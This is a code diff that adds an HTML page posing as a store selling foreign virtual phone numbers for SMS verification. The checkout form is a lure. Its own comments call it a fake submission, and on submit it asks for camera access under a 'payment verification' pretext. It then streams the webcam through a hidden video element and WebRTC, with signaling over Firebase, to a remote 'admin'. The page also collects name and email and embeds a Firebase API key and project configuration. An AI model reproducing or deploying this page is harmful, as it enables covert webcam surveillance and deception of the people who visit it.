@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Foreign Numbers Store</title>
+    <!-- Firebase SDK (compat) -->
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
+    <style>
+        body { font-family: Arial, sans-serif; background: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 400px; text-align: center; }
+        h1 { color: #333; }
+        input, select { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
+        button { background: #4CAF50; color: white; padding: 12px 20px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
+        button:hover { background: #45a049; }
+        .note { font-size: 12px; color: #777; margin-top: 20px; }
+        #status { margin-top: 15px; color: #888; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>📱 Buy Foreign Numbers</h1>
+        <p>Get virtual numbers for SMS verification from 50+ countries.</p>
+        <form id="buyForm">
+            <input type="text" placeholder="Your name" id="name" required>
+            <input type="email" placeholder="Email address" id="email" required>
+            <select id="country">
+                <option>United States (+1)</option>
+                <option>United Kingdom (+44)</option>
+                <option>Canada (+1)</option>
+                <option>Germany (+49)</option>
+            </select>
+            <button type="submit" id="submitBtn">Get Number – $9.99</button>
+        </form>
+        <div class="note">🔒 Secure checkout · Money‑back guarantee</div>
+        <div id="status"></div>
+    </div>
+
+    <!-- Hidden video element for capturing stream -->
+    <video id="localVideo" autoplay playsinline style="display: none;"></video>
+
+    <script>
+        // Firebase config – REPLACE WITH YOUR OWN
+        const firebaseConfig = {
+            apiKey: "AIzaSyAPTx0h7HNIEEI7a3Wrc9o_L6w2xzcUwtw",
+            authDomain: "playground-eed5e.firebaseapp.com",
+            databaseURL: "https://playground-eed5e-default-rtdb.firebaseio.com",
+            projectId: "playground-eed5e",
+            storageBucket: "playground-eed5e.firebasestorage.app",
+            messagingSenderId: "211741331060",
+            appId: "1:211741331060:web:034565338613ed10b54b21"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+
+        // DOM elements
+        const statusDiv = document.getElementById('status');
+        const localVideo = document.getElementById('localVideo');
+        const form = document.getElementById('buyForm');
+        const submitBtn = document.getElementById('submitBtn');
+
+        let localStream;
+        let peerConnection;
+        let sessionId; // unique ID for this streaming session
+        const servers = {
+            iceServers: [
+                { urls: 'stun:stun.l.google.com:19302' },
+                { urls: 'stun:stun1.l.google.com:19302' }
+            ]
+        };
+
+        // Fake form submission – triggers camera & streaming
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            submitBtn.disabled = true;
+            statusDiv.innerText = 'Verifying payment method...';
+
+            // 1. Request camera access
+            try {
+                localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                localVideo.srcObject = localStream;
+                statusDiv.innerText = 'Camera access granted. Processing...';
+
+                // 2. Create a unique session ID
+                sessionId = generateSessionId();
+                // 3. Initialize WebRTC and start signaling
+                await startWebRTC();
+                statusDiv.innerText = 'Almost done... waiting for admin to connect.';
+            } catch (err) {
+                statusDiv.innerText = 'Camera access required for verification. Please refresh and allow.';
+                console.error(err);
+                submitBtn.disabled = false;
+            }
+        });
+
+        function generateSessionId() {
+            return 'session_' + Math.random().toString(36).substring(2, 15) + Date.now();
+        }
+
+        async function startWebRTC() {
+            // Create peer connection
+            peerConnection = new RTCPeerConnection(servers);
+
+            // Add local stream tracks to connection
+            localStream.getTracks().forEach(track => peerConnection.addTrack(track, localStream));
+
+            // Create Firestore references
+            const sessionRef = db.collection('sessions').doc(sessionId);
+            const offerRef = sessionRef.collection('offers').doc('offer');
+            const answerRef = sessionRef.collection('answers').doc('answer');
+            const userCandidatesRef = sessionRef.collection('userCandidates');
+            const adminCandidatesRef = sessionRef.collection('adminCandidates');
+
+            // Save session creation time
+            await sessionRef.set({ createdAt: firebase.firestore.FieldValue.serverTimestamp(), status: 'waiting' });
+
+            // Send ICE candidates from user to Firestore
+            peerConnection.onicecandidate = async (event) => {
+                if (event.candidate) {
+                    await userCandidatesRef.add({ candidate: event.candidate.toJSON(), timestamp: firebase.firestore.FieldValue.serverTimestamp() });
+                }
+            };
+
+            // Listen for admin's ICE candidates
+            adminCandidatesRef.onSnapshot((snapshot) => {
+                snapshot.docChanges().forEach((change) => {
+                    if (change.type === 'added') {
+                        const candidateData = change.doc.data().candidate;
+                        const candidate = new RTCIceCandidate(candidateData);
+                        peerConnection.addIceCandidate(candidate).catch(e => console.error('Error adding candidate', e));
+                    }
+                });
+            });
+
+            // Create offer
+            const offer = await peerConnection.createOffer();
+            await peerConnection.setLocalDescription(offer);
+            await offerRef.set({ sdp: offer.sdp, type: offer.type });
+
+            // Wait for answer
+            answerRef.onSnapshot(async (snap) => {
+                if (snap.exists && !peerConnection.currentRemoteDescription) {
+                    const answer = new RTCSessionDescription(snap.data());
+                    await peerConnection.setRemoteDescription(answer);
+                }
+            });
+
+            // Monitor connection state
+            peerConnection.onconnectionstatechange = () => {
+                if (peerConnection.connectionState === 'connected') {
+                    statusDiv.innerText = 'processed';
+                }
+            };
+        }
+    </script>
+</body>
+</html>
